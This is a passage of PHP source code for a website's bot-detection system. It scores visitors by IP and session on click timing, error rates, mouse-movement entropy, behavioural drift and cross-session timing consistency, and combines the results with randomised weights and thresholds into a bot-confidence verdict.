    $trust = calculate_session_trust($fp_data['created_at'], $config);
    
    // Re-evaluate if trust below 30%
    if ($trust < 30) {
        return true;
    }
    
    // Check for behavioral deviations
    $behavior_data = load_behavior_data();
    if (isset($behavior_data[$ip])) {
        $ip_behavior = $behavior_data[$ip];
        
        // Check for sudden changes in behavior patterns
        if (isset($ip_behavior['sessions'])) {
            $sessions = array_values($ip_behavior['sessions']);
            $session_count = count($sessions);
            
            if ($session_count >= 2) {
                // Compare recent session to earlier sessions
                $recent = end($sessions);
                $earlier = $sessions[0];
                
                // Check if action patterns changed significantly
                $recent_actions = count($recent['actions'] ?? []);
                $earlier_actions = count($earlier['actions'] ?? []);
                
                if ($earlier_actions > 0) {
                    $change_ratio = abs($recent_actions - $earlier_actions) / $earlier_actions;
                    
                    // If pattern changed more than 200%, flag for re-evaluation
                    if ($change_ratio > 2.0) {
                        return true;
                    }
                }
            }
        }
    }
    
    return false;
}

/**
 * Force session re-verification
 */
function force_session_reverification($ip) {
    // Clear all cookies
    setcookie('fp_hash', '', time() - 3600, '/');
    setcookie('js_verified', '', time() - 3600, '/');
    setcookie('analysis_done', '', time() - 3600, '/');
    setcookie('behavior_verified', '', time() - 3600, '/');
    
    // Remove fingerprint
    $fps = load_fingerprints();
    unset($fps[$ip]);
    file_put_contents(FP_FILE, json_encode($fps, JSON_PRETTY_PRINT));
}

function track_temporal_behavior($ip, $action, $timestamp, $data = []) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip])) {
        $behaviors[$ip] = ['sessions' => [], 'first_seen' => time()];
    }
    
    // Sanitize session ID from cookie or use PHP's session_id()
    $raw_session_id = $_COOKIE['session_id'] ?? session_id();
    $session_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $raw_session_id);
    $session_id = substr($session_id, 0, 64); // Limit length
    
    if (!isset($behaviors[$ip]['sessions'][$session_id])) {
        $behaviors[$ip]['sessions'][$session_id] = ['actions' => [], 'start_time' => time()];
    }
    
    $behaviors[$ip]['sessions'][$session_id]['actions'][] = [
        'action' => $action,
        'timestamp' => $timestamp,
        'data' => $data
    ];
    
    save_behavior_data($behaviors);
    return $behaviors[$ip];
}

function analyze_temporal_patterns($ip) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    
    foreach ($behaviors[$ip]['sessions'] as $session_id => $session) {
        if (empty($session['actions']) || count($session['actions']) < 3) {
            continue;
        }
        
        $timings = [];
        for ($i = 1; $i < count($session['actions']); $i++) {
            $diff = $session['actions'][$i]['timestamp'] - $session['actions'][$i-1]['timestamp'];
            $timings[] = $diff;
        }
        
        // Check for mathematically equal timings
        $timing_variance = count(array_unique($timings)) / max(count($timings), 1);
        if ($timing_variance < 0.5 && count($timings) >= 3) {
            $score += 30;
            $reasons[] = 'Equal click timings detected';
        }
        
        // Check for absence of hesitation (all actions too fast)
        // Threshold: MIN_HUMAN_ACTION_TIME - Human users typically take at least 100ms between actions
        // due to perception, decision-making, and motor response time
        $avg_timing = array_sum($timings) / max(count($timings), 1);
        if ($avg_timing < MIN_HUMAN_ACTION_TIME) {
            $score += 25;
            $reasons[] = 'No hesitation or natural pauses';
        }
        
        // Check for constant reading times
        $reading_actions = array_filter($session['actions'], function($a) {
            return isset($a['data']['text_length']);
        });
        if (count($reading_actions) >= 2) {
            $read_times = [];
            foreach ($reading_actions as $action) {
                if (isset($action['data']['read_time'])) {
                    $read_times[] = $action['data']['read_time'];
                }
            }
            if (count($read_times) >= 2 && count(array_unique($read_times)) === 1) {
                $score += 20;
                $reasons[] = 'Constant reading times regardless of content';
            }
        }
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

function analyze_interaction_noise($ip) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    $total_actions = 0;
    $error_count = 0;
    $canceled_count = 0;
    $efficient_count = 0;
    
    foreach ($behaviors[$ip]['sessions'] as $session) {
        foreach ($session['actions'] as $action) {
            $total_actions++;
            
            if (isset($action['data']['input_error']) && $action['data']['input_error']) {
                $error_count++;
            }
            if (isset($action['data']['canceled']) && $action['data']['canceled']) {
                $canceled_count++;
            }
            if (isset($action['data']['skipped_visual_hints']) && $action['data']['skipped_visual_hints']) {
                $efficient_count++;
            }
        }
    }
    
    // Human users make minor errors
    if ($total_actions > 10 && $error_count === 0 && $canceled_count === 0) {
        $score += 40;
        $reasons[] = 'No interaction noise (errors/cancellations)';
    }
    
    // Over-efficient interaction
    if ($total_actions > 5 && $efficient_count / $total_actions > 0.8) {
        $score += 35;
        $reasons[] = 'Overly efficient, ignoring visual hints';
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

function analyze_ui_semantics($ip) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    
    foreach ($behaviors[$ip]['sessions'] as $session) {
        $ignores_cosmetic = 0;
        $total_interactions = 0;
        
        foreach ($session['actions'] as $action) {
            if (isset($action['data']['element_type'])) {
                $total_interactions++;
                if (isset($action['data']['ignores_cosmetic']) && $action['data']['ignores_cosmetic']) {
                    $ignores_cosmetic++;
                }
            }
        }
        
        if ($total_interactions > 0 && $ignores_cosmetic / $total_interactions > 0.9) {
            $score += 45;
            $reasons[] = 'Ignores cosmetic/decorative elements';
        }
        
        // Check for robotic patterns unaffected by visual rearrangement
        if (isset($session['actions'][0]['data']['visual_order_changed'])) {
            $unchanged_pattern = true;
            for ($i = 1; $i < count($session['actions']); $i++) {
                if (isset($session['actions'][$i]['data']['adapted_to_order'])) {
                    $unchanged_pattern = false;
                    break;
                }
            }
            if ($unchanged_pattern && count($session['actions']) > 3) {
                $score += 40;
                $reasons[] = 'Robotic pattern, unaffected by visual changes';
            }
        }
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

/**
 * Analyze mouse movement characteristics for bot detection
 * Examines entropy, smoothness, jitter, and linear patterns
 */
function analyze_mouse_movements($ip) {
    global $config;
    
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    $mouse_config = $config['mouse_analysis'] ?? [];
    
    // Analyze mouse_analysis actions from JavaScript tracking
    foreach ($behaviors[$ip]['sessions'] as $session) {
        foreach ($session['actions'] as $action) {
            if ($action['action'] === 'mouse_analysis' && isset($action['data'])) {
                $data = $action['data'];
                
                // Check entropy (should be > 0.3 for humans)
                if (isset($data['entropy'])) {
                    $min_entropy = $mouse_config['min_entropy'] ?? 0.3;
                    if ($data['entropy'] < $min_entropy) {
                        $score += 35;
                        $reasons[] = 'Low mouse movement entropy (predictable patterns)';
                    }
                }
                
                // Check smoothness (too smooth = bot)
                if (isset($data['smoothness'])) {
                    $max_smoothness = $mouse_config['curve_smoothness_max'] ?? 0.9;
                    if ($data['smoothness'] > $max_smoothness) {
                        $score += 30;
                        $reasons[] = 'Overly smooth mouse curves (no natural variation)';
                    }
                }
                
                // Check jitter (humans have natural hand tremor)
                if (isset($data['jitter'])) {
                    $min_jitter = $mouse_config['min_jitter_variance'] ?? 0.1;
                    if ($data['jitter'] < $min_jitter && $mouse_config['jitter_required'] ?? true) {
                        $score += 25;
                        $reasons[] = 'No mouse jitter (missing natural hand tremor)';
                    }
                }
                
                // Check for linear movements
                if (isset($data['is_linear']) && $data['is_linear']) {
                    $score += 40;
                    $reasons[] = 'Perfectly linear mouse movements (bot-like)';
                }
            }
        }
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

/**
 * Detect idealized/perfect behavior patterns
 * PHILOSOPHY: Humans are noisy; bots are perfect. REJECT PERFECTION.
 * Always punish: excessive consistency, lack of hesitation, uniform responses
 * Automatically increase risk score even with clean IPs
 */
function detect_idealized_behavior($ip) {
    global $config;
    
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    $idealized_config = $config['idealized_behavior'] ?? [];
    
    $all_sessions = $behaviors[$ip]['sessions'];
    
    // 1. Check for perfect timing (zero variance) - HUMANS ARE NOISY
    $all_intervals = [];
    foreach ($all_sessions as $session) {
        if (isset($session['actions']) && count($session['actions']) > 2) {
            for ($i = 1; $i < count($session['actions']); $i++) {
                $interval = $session['actions'][$i]['timestamp'] - $session['actions'][$i-1]['timestamp'];
                $all_intervals[] = $interval;
            }
        }
    }
    
    if (count($all_intervals) >= 5) {
        $avg_interval = array_sum($all_intervals) / count($all_intervals);
        $variance = 0;
        foreach ($all_intervals as $interval) {
            $variance += pow($interval - $avg_interval, 2);
        }
        $variance = $variance / count($all_intervals);
        $std_dev = sqrt($variance);
        
        // Calculate coefficient of variation
        $cv = $avg_interval > 0 ? ($std_dev / $avg_interval) : 0;
        
        $perfect_timing_threshold = $idealized_config['perfect_timing_threshold'] ?? 0.15;
        if ($cv < $perfect_timing_threshold) {
            $penalty = $idealized_config['excessive_consistency_penalty'] ?? 55;
            $score += $penalty;
            $reasons[] = sprintf(
                'Perfect timing intervals (CV: %.3f, mathematical precision, no human variance) - HUMANS ARE NOISY',
                $cv
            );
        }
    }
    
    // 2. Check for zero errors across all sessions - BOTS ARE PERFECT
    $total_actions = 0;
    $error_actions = 0;
    $correction_actions = 0;
    foreach ($all_sessions as $session) {
        if (isset($session['actions'])) {
            foreach ($session['actions'] as $action) {
                $total_actions++;
                if (in_array($action['action'], ['keystroke', 'click_canceled']) && 
                    isset($action['data']['input_error']) && $action['data']['input_error']) {
                    $error_actions++;
                }
                if ($action['action'] === 'keystroke' && isset($action['data']['correction']) && $action['data']['correction']) {
                    $correction_actions++;
                }
            }
        }
    }
    
    if ($total_actions > 20 && $error_actions === 0 && $correction_actions === 0) {
        $penalty = $idealized_config['zero_error_penalty'] ?? 50;
        $score += $penalty;
        $reasons[] = sprintf(
            'Zero errors in %d actions (inhuman perfection) - REJECT PERFECTION',
            $total_actions
        );
    }
    
    // 3. Check for lack of hesitation - HUMANS HESITATE
    $hesitation_count = 0;
    foreach ($all_sessions as $session) {
        if (isset($session['actions']) && count($session['actions']) > 3) {
            for ($i = 1; $i < count($session['actions']); $i++) {
                $interval = $session['actions'][$i]['timestamp'] - $session['actions'][$i-1]['timestamp'];
                // Hesitation = pause > 500ms between actions
                if ($interval > 500) {
                    $hesitation_count++;
                }
            }
        }
    }
    
    if ($total_actions > 10 && $hesitation_count === 0) {
        $penalty = $idealized_config['no_hesitation_penalty'] ?? 45;
        $score += $penalty;
        $reasons[] = sprintf(
            'No hesitation detected in %d actions (no human pauses) - HUMANS HESITATE',
            $total_actions
        );
    }
    
    // 4. Check for identical navigation paths - HUMANS VARY
    $nav_paths = [];
    foreach ($all_sessions as $session) {
        $path = [];
        if (isset($session['actions'])) {
            foreach ($session['actions'] as $action) {
                if ($action['action'] === 'navigate' && isset($action['data']['path'])) {
                    $path[] = $action['data']['path'];
                }
            }
        }
        if (!empty($path)) {
            $nav_paths[] = implode('->', $path);
        }
    }
    
    if (count($nav_paths) >= 2) {
        $unique_paths = count(array_unique($nav_paths));
        if ($unique_paths === 1) {
            // All paths identical
            $penalty = $idealized_config['identical_path_penalty'] ?? 60;
            $score += $penalty;
            $reasons[] = 'Identical navigation path repeated across all sessions - HUMANS VARY';
        }
    }
    
    // 5. Check for uniform response times - HUMANS VARY RESPONSES
    $response_times = [];
    foreach ($all_sessions as $session) {
        if (isset($session['actions']) && count($session['actions']) > 1) {
            $first_action = $session['actions'][0]['timestamp'] ?? 0;
            $last_action = end($session['actions'])['timestamp'] ?? 0;
            if ($last_action > $first_action) {
                $response_times[] = $last_action - $first_action;
            }
        }
    }
    
    if (count($response_times) >= 3) {
        $avg_response = array_sum($response_times) / count($response_times);
        $variance = 0;
        foreach ($response_times as $time) {
            $variance += pow($time - $avg_response, 2);
        }
        $variance = $variance / count($response_times);
        $cv = $avg_response > 0 ? (sqrt($variance) / $avg_response) : 0;
        
        if ($cv < 0.2) {
            $penalty = $idealized_config['uniform_response_penalty'] ?? 40;
            $score += $penalty;
            $reasons[] = sprintf(
                'Uniform response times across sessions (CV: %.3f) - HUMANS VARY RESPONSES',
                $cv
            );
        }
    }
    
    // 6. Check for reused fingerprints across sessions - REPLAY ATTACK
    $fps = load_fingerprints();
    $fp_history = [];
    foreach ($fps as $ip_key => $fp_data) {
        if ($ip_key === $ip && isset($fp_data['hash'])) {
            $fp_history[] = $fp_data['hash'];
        }
    }
    
    // Check if same fingerprint used multiple times (should change hourly)
    if (count($fp_history) > 1) {
        $unique_fps = count(array_unique($fp_history));
        if ($unique_fps === 1 && count($fp_history) >= 3) {
            $penalty = $idealized_config['identical_fingerprint_penalty'] ?? 70;
            $score += $penalty;
            $reasons[] = sprintf(
                'Identical fingerprint reused %d times (replay attack) - REJECT PERFECTION',
                count($fp_history)
            );
        }
    }
    
    // 7. Check for excessive consistency even with clean IPs
    // This ensures clean IPs don't bypass perfection detection
    if ($score > 0) {
        $reasons[] = 'Risk increased regardless of IP reputation (perfection detected)';
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

function analyze_session_continuity($ip) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    $sessions = $behaviors[$ip]['sessions'];
    
    if (count($sessions) < 2) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $navigation_patterns = [];
    foreach ($sessions as $session) {
        $nav_sequence = [];
        foreach ($session['actions'] as $action) {
            if ($action['action'] === 'navigate' && isset($action['data']['path'])) {
                $nav_sequence[] = $action['data']['path'];
            }
        }
        if (!empty($nav_sequence)) {
            $navigation_patterns[] = implode('>', $nav_sequence);
        }
    }
    
    // Check for repeated identical navigation without natural variation
    if (count($navigation_patterns) >= 2) {
        $unique_patterns = count(array_unique($navigation_patterns));
        if ($unique_patterns / count($navigation_patterns) < 0.3) {
            $score += 50;
            $reasons[] = 'Repeated identical navigation patterns';
        }
    }
    
    // Check for missing ordinary resume logic
    $session_times = array_column($sessions, 'start_time');
    sort($session_times);
    for ($i = 1; $i < count($session_times); $i++) {
        $gap = $session_times[$i] - $session_times[$i-1];
        // Threshold: SESSION_GAP_THRESHOLD - Legitimate users typically have larger gaps between sessions
        // Sessions less than 5 seconds apart indicate automated behavior without natural delays
        if ($gap < SESSION_GAP_THRESHOLD) {
            $score += SESSION_GAP_SCORE;
            $reasons[] = 'Suspicious session timing, missing resume logic';
            break;
        }
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

/**
 * Get randomized evaluation window
 * Makes evaluation windows unpredictable to prevent reverse engineering
 * Static logic is learnable and therefore unacceptable
 */
function get_randomized_window($base_window_seconds, $config) {
    if (!($config['evaluation_windows_randomized'] ?? true)) {
        return $base_window_seconds;
    }
    
    $variance_pct = ($config['window_variance'] ?? 20) / 100;
    
    // Add random variance +/- variance_pct
    $variance = (mt_rand() / mt_getrandmax() * 2 - 1) * $variance_pct;
    $randomized = $base_window_seconds * (1 + $variance);
    
    return max(1, $randomized); // At least 1 second
}

/**
 * Randomize check order to prevent static logic detection
 * Returns shuffled array of check names
 */
function randomize_check_order($config) {
    if (!($config['evaluation_order_randomized'] ?? true)) {
        return [
            'temporal',
            'noise',
            'semantics',
            'continuity',
            'mouse',
            'idealized',
            'drift',
            'entropy_memory'
        ];
    }
    
    $checks = [
        'temporal',
        'noise',
        'semantics',
        'continuity',
        'mouse',
        'idealized',
        'drift',
        'entropy_memory'
    ];
    
    shuffle($checks);
    return $checks;
}

/**
 * Analyze timing entropy across multiple sessions (Entropy Memory)
 * Stores and compares average time variance per fingerprint
 * Detects automation through consistent timing with minimal variation
 * NO reliance on mouse or buttons - purely time and physics
 */
function analyze_timing_entropy_memory($ip) {
    global $config;
    
    $entropy_config = $config['entropy_memory'] ?? [];
    if (!($entropy_config['enabled'] ?? true)) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    
    // Load entropy memory storage
    $entropy_file = __DIR__ . '/entropy_memory.json';
    $entropy_data = [];
    if (file_exists($entropy_file)) {
        $entropy_data = json_decode(file_get_contents($entropy_file), true) ?: [];
    }
    
    // Get current behavior data
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $all_sessions = $behaviors[$ip]['sessions'];
    $min_sessions = $entropy_config['min_sessions_for_comparison'] ?? 2;
    
    if (count($all_sessions) < $min_sessions) {
        return ['score' => 0, 'reasons' => []];
    }
    
    // Calculate timing statistics for each session
    $session_stats = [];
    foreach ($all_sessions as $session_id => $session) {
        if (!isset($session['actions']) || count($session['actions']) < 3) {
            continue;
        }
        
        $intervals = [];
        for ($i = 1; $i < count($session['actions']); $i++) {
            $interval = $session['actions'][$i]['timestamp'] - $session['actions'][$i-1]['timestamp'];
            $intervals[] = $interval;
        }
        
        if (empty($intervals)) {
            continue;
        }
        
        $avg_interval = array_sum($intervals) / count($intervals);
        $variance = 0;
        foreach ($intervals as $interval) {
            $variance += pow($interval - $avg_interval, 2);
        }
        $variance = $variance / count($intervals);
        $std_dev = sqrt($variance);
        
        // Coefficient of variation (CV) - normalized measure of dispersion
        $cv = $avg_interval > 0 ? ($std_dev / $avg_interval) : 0;
        
        $session_stats[] = [
            'session_id' => $session_id,
            'avg_interval' => $avg_interval,
            'std_dev' => $std_dev,
            'cv' => $cv,
            'intervals' => $intervals
        ];
    }
    
    if (count($session_stats) < $min_sessions) {
        return ['score' => 0, 'reasons' => []];
    }
    
    // Store entropy memory for this IP
    if (!isset($entropy_data[$ip])) {
        $entropy_data[$ip] = [
            'first_seen' => time(),
            'sessions' => []
        ];
    }
    
    foreach ($session_stats as $stats) {
        $entropy_data[$ip]['sessions'][$stats['session_id']] = [
            'timestamp' => time(),
            'avg_interval' => $stats['avg_interval'],
            'std_dev' => $stats['std_dev'],
            'cv' => $stats['cv']
        ];
    }
    
    $entropy_data[$ip]['last_updated'] = time();
    
    // Cleanup old entropy data (randomized retention window)
    $base_retention_days = 7;
    $retention_seconds = get_randomized_window($base_retention_days * 86400, $config);
    $cutoff = time() - $retention_seconds;
    foreach ($entropy_data as $ip_key => $data) {
        if (($data['last_updated'] ?? 0) < $cutoff) {
            unset($entropy_data[$ip_key]);
        }
    }
    
    file_put_contents($entropy_file, json_encode($entropy_data, JSON_PRETTY_PRINT));
    
    // CROSS-SESSION ANALYSIS: Compare timing patterns across sessions
    $all_cvs = array_column($session_stats, 'cv');
    $all_avg_intervals = array_column($session_stats, 'avg_interval');
    
    // Calculate consistency across sessions
    $cv_variance = 0;
    $avg_cv = array_sum($all_cvs) / count($all_cvs);
    foreach ($all_cvs as $cv) {
        $cv_variance += pow($cv - $avg_cv, 2);
    }
    $cv_variance = $cv_variance / count($all_cvs);
    
    // Calculate interval consistency
    $interval_variance = 0;
    $avg_of_avgs = array_sum($all_avg_intervals) / count($all_avg_intervals);
    foreach ($all_avg_intervals as $avg) {
        $interval_variance += pow($avg - $avg_of_avgs, 2);
    }
    $interval_variance = $interval_variance / count($all_avg_intervals);
    $interval_cv = $avg_of_avgs > 0 ? (sqrt($interval_variance) / $avg_of_avgs) : 0;
    
    // DETECTION RULE: Consistent timing with minimal variation = Automation
    $consistency_threshold = $entropy_config['consistency_threshold'] ?? 0.1;
    
    if ($avg_cv < $consistency_threshold) {
        $penalty = $entropy_config['variance_penalty'] ?? 45;
        $score += $penalty;
        $reasons[] = sprintf(
            'Consistent timing with minimal variation across sessions (CV: %.3f < %.3f threshold)',
            $avg_cv,
            $consistency_threshold
        );
    }
    
    // Check if timing is too consistent across sessions
    if ($interval_cv < 0.15 && count($session_stats) >= 3) {
        $score += 40;
        $reasons[] = sprintf(
            'Near-identical timing patterns across %d sessions (interval CV: %.3f)',
            count($session_stats),
            $interval_cv
        );
    }
    
    // Check for mathematical precision (all intervals within 5% of mean)
    $precision_count = 0;
    foreach ($session_stats as $stats) {
        $within_precision = true;
        foreach ($stats['intervals'] as $interval) {
            $deviation_pct = abs($interval - $stats['avg_interval']) / $stats['avg_interval'];
            if ($deviation_pct > 0.05) {
                $within_precision = false;
                break;
            }
        }
        if ($within_precision && count($stats['intervals']) >= 3) {
            $precision_count++;
        }
    }
    
    if ($precision_count >= 2) {
        $score += 50;
        $reasons[] = sprintf(
            'Mathematical precision detected in %d sessions (all intervals within 5%% of mean)',
            $precision_count
        );
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

/**
 * Detect behavioral drift across sessions
 * Bots tend to have static, unchanging behavior patterns
 * Humans naturally vary their behavior over time
 */
function detect_behavioral_drift($ip) {
    global $config;
    
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $drift_config = $config['drift_detection'] ?? [];
    if (!($drift_config['enabled'] ?? true)) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    $sessions = array_values($behaviors[$ip]['sessions']);
    
    $min_sessions = $drift_config['min_sessions_for_drift'] ?? 3;
    if (count($sessions) < $min_sessions) {
        return ['score' => 0, 'reasons' => []];
    }
    
    // Calculate behavioral signatures for each session
    $signatures = [];
    foreach ($sessions as $session_idx => $session) {
        if (!isset($session['actions']) || empty($session['actions'])) {
            continue;
        }
        
        $actions = $session['actions'];
        $signature = [
            'action_count' => count($actions),
            'action_types' => [],
            'avg_timing' => 0,
            'timing_variance' => 0
        ];
        
        // Action type distribution
        $action_type_counts = [];
        foreach ($actions as $action) {
            $type = $action['action'] ?? 'unknown';
            $action_type_counts[$type] = ($action_type_counts[$type] ?? 0) + 1;
        }
        $signature['action_types'] = $action_type_counts;
        
        // Timing analysis
        if (count($actions) > 1) {
            $intervals = [];
            for ($i = 1; $i < count($actions); $i++) {
                $interval = $actions[$i]['timestamp'] - $actions[$i-1]['timestamp'];
                $intervals[] = $interval;
            }
            $signature['avg_timing'] = array_sum($intervals) / count($intervals);
            
            // Calculate variance
            $variance = 0;
            foreach ($intervals as $interval) {
                $variance += pow($interval - $signature['avg_timing'], 2);
            }
            $signature['timing_variance'] = count($intervals) > 0 ? $variance / count($intervals) : 0;
        }
        
        $signatures[] = $signature;
    }
    
    if (count($signatures) < 2) {
        return ['score' => 0, 'reasons' => []];
    }
    
    // Compare signatures to detect drift
    $similarity_scores = [];
    for ($i = 1; $i < count($signatures); $i++) {
        $sig1 = $signatures[$i-1];
        $sig2 = $signatures[$i];
        
        // Calculate similarity (0 = completely different, 1 = identical)
        $similarity = 0;
        $comparisons = 0;
        
        // Compare action counts
        if ($sig1['action_count'] > 0 && $sig2['action_count'] > 0) {
            $count_ratio = min($sig1['action_count'], $sig2['action_count']) / max($sig1['action_count'], $sig2['action_count']);
            $similarity += $count_ratio;
            $comparisons++;
        }
        
        // Compare action type distributions
        $all_types = array_unique(array_merge(
            array_keys($sig1['action_types']),
            array_keys($sig2['action_types'])
        ));
        
        if (!empty($all_types)) {
            $type_similarity = 0;
            foreach ($all_types as $type) {
                $count1 = $sig1['action_types'][$type] ?? 0;
                $count2 = $sig2['action_types'][$type] ?? 0;
                if ($count1 + $count2 > 0) {
                    $type_similarity += min($count1, $count2) / max($count1, $count2);
                }
            }
            $similarity += $type_similarity / count($all_types);
            $comparisons++;
        }
        
        // Compare timing patterns
        if ($sig1['avg_timing'] > 0 && $sig2['avg_timing'] > 0) {
            $timing_ratio = min($sig1['avg_timing'], $sig2['avg_timing']) / max($sig1['avg_timing'], $sig2['avg_timing']);
            $similarity += $timing_ratio;
            $comparisons++;
        }
        
        $similarity_scores[] = $comparisons > 0 ? $similarity / $comparisons : 0;
    }
    
    // Calculate average similarity
    $avg_similarity = count($similarity_scores) > 0 ? array_sum($similarity_scores) / count($similarity_scores) : 0;
    
    // Check if behavior is too static (high similarity = low drift = bot)
    $max_similarity = $drift_config['max_pattern_similarity'] ?? 0.7;
    if ($avg_similarity > $max_similarity) {
        $penalty = $drift_config['drift_penalty'] ?? 40;
        $score += $penalty;
        $reasons[] = sprintf(
            'No behavioral drift detected (%.0f%% similarity across %d sessions)',
            $avg_similarity * 100,
            count($sessions)
        );
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

function calculate_bot_confidence($ip) {
    global $config;
    
    // Run all analysis domains
    $temporal = analyze_temporal_patterns($ip);
    $noise = analyze_interaction_noise($ip);
    $semantics = analyze_ui_semantics($ip);
    $continuity = analyze_session_continuity($ip);
    $mouse = analyze_mouse_movements($ip);
    $idealized = detect_idealized_behavior($ip);
    $drift = detect_behavioral_drift($ip);
    $entropy_memory = analyze_timing_entropy_memory($ip); // NEW: Cross-session entropy analysis
    
    // ============================================
    // DYNAMIC WEIGHTS WITH RANDOMIZATION
    // ============================================
    
    // Base weights for each domain
    $base_weights = [
        'temporal' => 0.15,
        'noise' => 0.11,
        'semantics' => 0.11,
        'continuity' => 0.11,
        'mouse' => 0.15,
        'idealized' => 0.15,
        'drift' => 0.10,
        'entropy_memory' => 0.12 // NEW: Entropy memory analysis
    ];
    
    // Apply randomization to prevent reverse engineering
    $randomization_pct = ($config['weight_randomization'] ?? 10) / 100;
    $weights = [];
    
    if ($config['evaluation_order_randomized'] ?? true) {
        foreach ($base_weights as $domain => $weight) {
            // Add random variance +/- randomization_pct
            $variance = (mt_rand() / mt_getrandmax() * 2 - 1) * $randomization_pct;
            $weights[$domain] = $weight * (1 + $variance);
        }
        
        // Normalize weights to sum to 1.0
        $total = array_sum($weights);
        foreach ($weights as $domain => $weight) {
            $weights[$domain] = $weight / $total;
        }
    } else {
        $weights = $base_weights;
    }
    
    // ============================================
    // NON-LINEAR SCORING SYSTEM
    // ============================================
    
    // Non-linear scoring system for threat evaluation
    // High scores are amplified, low scores are dampened
    // This creates more decisive bot/human classification
    $apply_nonlinear = function($score) {
        if ($score < 20) {
            // Very low scores - dampen further (likely human)
            return $score * 0.5;
        } elseif ($score >= 20 && $score < 50) {
            // Medium scores - keep mostly linear
            return $score * 0.9;
        } elseif ($score >= 50 && $score < 70) {
            // High scores - amplify (likely bot)
            return $score * 1.2;
        } else {
            // Very high scores - amplify more (definitely bot)
            return min($score * 1.5, 100);
        }
    };
    
    // Apply non-linear transformation to each domain
    $temporal_adjusted = $apply_nonlinear($temporal['score']);
    $noise_adjusted = $apply_nonlinear($noise['score']);
    $semantics_adjusted = $apply_nonlinear($semantics['score']);
    $continuity_adjusted = $apply_nonlinear($continuity['score']);
    $mouse_adjusted = $apply_nonlinear($mouse['score']);
    $idealized_adjusted = $apply_nonlinear($idealized['score']);
    $drift_adjusted = $apply_nonlinear($drift['score']);
    $entropy_adjusted = $apply_nonlinear($entropy_memory['score']); // NEW
    
    // Weighted average with dynamic weights
    $total_score = (
        $temporal_adjusted * $weights['temporal'] +
        $noise_adjusted * $weights['noise'] +
        $semantics_adjusted * $weights['semantics'] +
        $continuity_adjusted * $weights['continuity'] +
        $mouse_adjusted * $weights['mouse'] +
        $idealized_adjusted * $weights['idealized'] +
        $drift_adjusted * $weights['drift'] +
        $entropy_adjusted * $weights['entropy_memory'] // NEW
    );
    
    // Apply final non-linear transformation to total
    $final_score = $apply_nonlinear($total_score);
    
    // ============================================
    // DYNAMIC THRESHOLDS WITH RANDOMIZATION
    // ============================================
    
    // Randomize thresholds once at start to prevent reverse engineering
    $human_threshold = mt_rand(
        $config['threshold_human_min'] ?? 15,
        $config['threshold_human_max'] ?? 25
    );
    
    $bot_threshold = mt_rand(
        $config['threshold_bot_min'] ?? 50,
        $config['threshold_bot_max'] ?? 65
    );
    
    // Collect all reasons
    $all_reasons = array_merge(
        $temporal['reasons'],
        $noise['reasons'],
        $semantics['reasons'],
        $continuity['reasons'],
        $mouse['reasons'],
        $idealized['reasons'],
        $drift['reasons'],
        $entropy_memory['reasons'] // NEW
    );
    
    // ============================================
    // SILENT SCORING (OBFUSCATED OUTPUT)
    // ============================================
    
    $silent_scoring = $config['silent_scoring_enabled'] ?? true;
    
    return [
        'confidence' => min($final_score, 100),
        'is_confident_human' => $final_score < $human_threshold,
        'is_uncertain' => $final_score >= $human_threshold && $final_score < $bot_threshold,
        'is_likely_bot' => $final_score >= $bot_threshold,
        'reasons' => $all_reasons,
        'domain_scores' => [
            'temporal' => $temporal['score'],
            'noise' => $noise['score'],
            'semantics' => $semantics['score'],
            'continuity' => $continuity['score'],
            'mouse' => $mouse['score'],
            'idealized' => $idealized['score'],
            'drift' => $drift['score'],
            'entropy_memory' => $entropy_memory['score'] // NEW
        ],
        'adjusted_scores' => $silent_scoring ? 'hidden' : [
            'temporal' => $temporal_adjusted,
            'noise' => $noise_adjusted,
            'semantics' => $semantics_adjusted,
            'continuity' => $continuity_adjusted,
            'mouse' => $mouse_adjusted,
            'idealized' => $idealized_adjusted,
            'drift' => $drift_adjusted,
            'entropy_memory' => $entropy_adjusted // NEW
        ],
        'weights_used' => $silent_scoring ? 'hidden' : $weights,
        'thresholds_used' => $silent_scoring ? 'hidden' : [
            'human' => $human_threshold,
            'bot' => $bot_threshold
        ]
    ];
}

// ============================================
// SHADOW ENFORCEMENT LAYER
// ============================================

/**
